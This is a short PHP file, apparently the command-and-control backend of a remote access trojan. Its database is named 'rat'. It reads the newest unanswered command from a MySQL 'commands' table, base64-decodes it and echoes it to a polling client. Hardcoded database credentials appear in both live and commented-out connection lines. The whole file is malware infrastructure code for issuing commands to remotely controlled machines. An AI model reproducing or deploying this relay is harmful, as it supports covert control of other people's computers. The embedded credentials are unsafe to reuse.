<?php

//mysql_connect("localhost", "nzbkpavw_rat", "pq97r") or die(mysql_error());
//mysql_select_db("nzbkpavw_rat") or die(mysql_error());
mysql_connect("localhost", "admin", "pq97r") or die(mysql_error());
mysql_select_db("rat") or die(mysql_error());

$result = mysql_query("SELECT id, command FROM commands WHERE response = '' ORDER BY ID DESC LIMIT 1");
if ($data = mysql_fetch_array($result)) {
	$command = base64_decode($data['command']);
	$command = str_replace("\\\\", "#$*BACKSLASH*$#", $command);
	$command = str_replace("\\", "", $command);
	echo $data['id'].':'.str_replace("#$*BACKSLASH*$#", "\\", $command);
}

?>